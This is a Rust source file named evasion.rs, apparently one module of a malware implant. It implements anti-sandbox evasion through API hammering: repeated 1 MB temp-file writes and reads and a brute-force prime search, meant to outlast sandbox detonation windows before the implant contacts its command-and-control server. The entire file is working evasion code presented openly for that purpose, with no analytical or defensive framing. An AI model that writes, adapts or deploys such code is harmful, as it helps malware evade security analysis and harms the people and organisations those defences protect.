// evasion.rs — Anti-sandbox via API hammering
//
// Burns time through two methods before the beacon loop starts:
//   1. Repeated temp-file I/O with random data (1 MB writes + reads, 300x)
//   2. CPU-bound prime search (2000 primes)
//
// Sandboxes with short detonation windows will time out before the implant
// connects to the C2. Both methods are silent on I/O errors.

use rand::{thread_rng, Rng};
use std::fs::{remove_file, File};
use std::io::{Read, Write};

pub fn evade() {
    io_hammer(300);
    calc_primes(2000);
}

fn io_hammer(iterations: usize) {
    let path = std::env::temp_dir().join("tmp_cache.dat");
    let size  = 0xFFFFF; // ~1 MB

    for _ in 0..iterations {
        let data: Vec<u8> = (0..size).map(|_| thread_rng().gen()).collect();
        if let Ok(mut f) = File::create(&path) {
            let _ = f.write_all(&data);
        }
        if let Ok(mut f) = File::open(&path) {
            let mut buf = vec![0u8; size];
            let _ = f.read_exact(&mut buf);
        }
    }
    let _ = remove_file(&path);
}

#[inline(never)]
fn calc_primes(count: usize) {
    let mut found = 0usize;
    let mut n     = 2usize;
    while found < count {
        if (2..n).all(|d| n % d != 0) {
            found += 1;
        }
        n += 1;
    }
}
